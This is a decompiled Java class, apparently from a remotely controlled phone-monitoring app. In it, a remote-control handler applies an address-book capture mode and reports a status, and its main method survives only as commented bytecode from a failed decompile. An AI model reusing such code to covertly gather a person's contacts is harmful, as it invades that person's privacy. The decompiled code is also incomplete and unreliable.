package com.vvt.appengine.a;

import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class av
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private ConditionVariable c;
  private com.vvt.addressbookmanager.a d;
  private RmtCtrlOutputStatusMessage e;
  
  public av()
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.e = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = b();
    this.d = ((com.vvt.addressbookmanager.a)localObject);
  }
  
  private com.vvt.addressbookmanager.a b()
  {
    aw localaw = new com/vvt/appengine/a/aw;
    localaw.<init>(this);
    return localaw;
  }
  
  /* Error */
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: getstatic 18	com/vvt/appengine/a/av:a	Z
    //   5: istore_2
    //   6: iload_2
    //   7: ifeq +3 -> 10
    //   10: aload_1
    //   11: getfield 49	com/vvt/appengine/AppEngine1:C	Lcom/vvt/addressbookmanager/removeFromPath;
    //   14: astore_3
    //   15: aload_3
    //   16: ifnull +133 -> 149
    //   19: new 51	android/os/ConditionVariable
    //   22: astore_3
    //   23: aconst_null
    //   24: astore 4
    //   26: aload_3
    //   27: iconst_0
    //   28: invokespecial 54	android/os/ConditionVariable:<init>	(Z)V
    //   31: aload_0
    //   32: aload_3
    //   33: putfield 38	com/vvt/appengine/a/av:MyUncaughtExceptionHandler	Landroid/os/ConditionVariable;
    //   36: aload_1
    //   37: getfield 58	com/vvt/appengine/AppEngine1:n	Lcom/vvt/preference/removeFromPath;
    //   40: astore_3
    //   41: getstatic 64	com/vvt/preference/FxPreferenceType:ADDRESSBOOK	Lcom/vvt/preference/FxPreferenceType;
    //   44: astore 4
    //   46: aload_3
    //   47: aload 4
    //   49: invokevirtual 69	com/vvt/preference/removeFromPath:a	(Lcom/vvt/preference/FxPreferenceType;)Lcom/vvt/preference/a;
    //   52: astore_3
    //   53: aload_3
    //   54: checkcast 71	com/vvt/preference/PrefAddressBook
    //   57: astore_3
    //   58: aload_3
    //   59: invokevirtual 75	com/vvt/preference/PrefAddressBook:getMode	()Lcom/vvt/base/FxAddressbookMode;
    //   62: astore_3
    //   63: aload_1
    //   64: getfield 49	com/vvt/appengine/AppEngine1:C	Lcom/vvt/addressbookmanager/removeFromPath;
    //   67: astore 4
    //   69: aload 4
    //   71: aload_3
    //   72: invokevirtual 80	com/vvt/addressbookmanager/removeFromPath:a	(Lcom/vvt/base/FxAddressbookMode;)V
    //   75: aload_1
    //   76: getfield 49	com/vvt/appengine/AppEngine1:C	Lcom/vvt/addressbookmanager/removeFromPath;
    //   79: astore_3
    //   80: aload_3
    //   81: invokevirtual 83	com/vvt/addressbookmanager/removeFromPath:i	()V
    //   84: aload_1
    //   85: getfield 49	com/vvt/appengine/AppEngine1:C	Lcom/vvt/addressbookmanager/removeFromPath;
    //   88: astore_3
    //   89: aload_3
    //   90: invokevirtual 86	com/vvt/addressbookmanager/removeFromPath:AppEngine1	()V
    //   93: aload_1
    //   94: getfield 49	com/vvt/appengine/AppEngine1:C	Lcom/vvt/addressbookmanager/removeFromPath;
    //   97: astore_3
    //   98: aload_0
    //   99: getfield 36	com/vvt/appengine/a/av:d	Lcom/vvt/addressbookmanager/a;
    //   102: astore 4
    //   104: aload_3
    //   105: aload 4
    //   107: iconst_0
    //   108: invokevirtual 89	com/vvt/addressbookmanager/removeFromPath:a	(Lcom/vvt/addressbookmanager/a;I)V
    //   111: aload_0
    //   112: getfield 38	com/vvt/appengine/a/av:MyUncaughtExceptionHandler	Landroid/os/ConditionVariable;
    //   115: astore_3
    //   116: aload_3
    //   117: invokevirtual 92	android/os/ConditionVariable:block	()V
    //   120: getstatic 18	com/vvt/appengine/a/av:a	Z
    //   123: istore_2
    //   124: iload_2
    //   125: ifeq +3 -> 128
    //   128: aload_0
    //   129: getfield 31	com/vvt/appengine/a/av:e	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   132: astore_3
    //   133: aload_0
    //   134: monitorexit
    //   135: aload_3
    //   136: areturn
    //   137: astore_3
    //   138: getstatic 22	com/vvt/appengine/a/av:removeFromPath	Z
    //   141: istore_2
    //   142: iload_2
    //   143: ifeq -68 -> 75
    //   146: goto -71 -> 75
    //   149: aload_0
    //   150: getfield 31	com/vvt/appengine/a/av:e	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   153: astore_3
    //   154: aconst_null
    //   155: astore 4
    //   157: aload_3
    //   158: iconst_0
    //   159: invokevirtual 95	com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage:setSuccess	(Z)V
    //   162: aload_0
    //   163: getfield 31	com/vvt/appengine/a/av:e	Lcom/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    //   166: astore_3
    //   167: ldc 97
    //   169: astore 4
    //   171: aload_3
    //   172: aload 4
    //   174: invokevirtual 101	com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage:setMessage	(Ljava/lang/String;)V
    //   177: goto -57 -> 120
    //   180: astore_3
    //   181: aload_0
    //   182: monitorexit
    //   183: aload_3
    //   184: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	185	0	this	av
    //   0	185	1	paramh	com.vvt.appengine.AppEngine1
    //   5	138	2	bool	boolean
    //   14	122	3	localObject1	Object
    //   137	1	3	localFxPreferenceException	com.vvt.preference.FxPreferenceException
    //   153	19	3	localRmtCtrlOutputStatusMessage	RmtCtrlOutputStatusMessage
    //   180	4	3	localObject2	Object
    //   24	149	4	localObject3	Object
    // Exception table:
    //   from	to	target	type
    //   41	44	137	com/vvt/preference/FxPreferenceException
    //   47	52	137	com/vvt/preference/FxPreferenceException
    //   53	57	137	com/vvt/preference/FxPreferenceException
    //   58	62	137	com/vvt/preference/FxPreferenceException
    //   63	67	137	com/vvt/preference/FxPreferenceException
    //   71	75	137	com/vvt/preference/FxPreferenceException
    //   2	5	180	finally
    //   10	14	180	finally
    //   19	22	180	finally
    //   27	31	180	finally
    //   32	36	180	finally
    //   36	40	180	finally
    //   41	44	180	finally
    //   47	52	180	finally
    //   53	57	180	finally
    //   58	62	180	finally
    //   63	67	180	finally
    //   71	75	180	finally
    //   75	79	180	finally
    //   80	84	180	finally
    //   84	88	180	finally
    //   89	93	180	finally
    //   93	97	180	finally
    //   98	102	180	finally
    //   107	111	180	finally
    //   111	115	180	finally
    //   116	120	180	finally
    //   120	123	180	finally
    //   128	132	180	finally
    //   138	141	180	finally
    //   149	153	180	finally
    //   158	162	180	finally
    //   162	166	180	finally
    //   172	177	180	finally
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/av.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */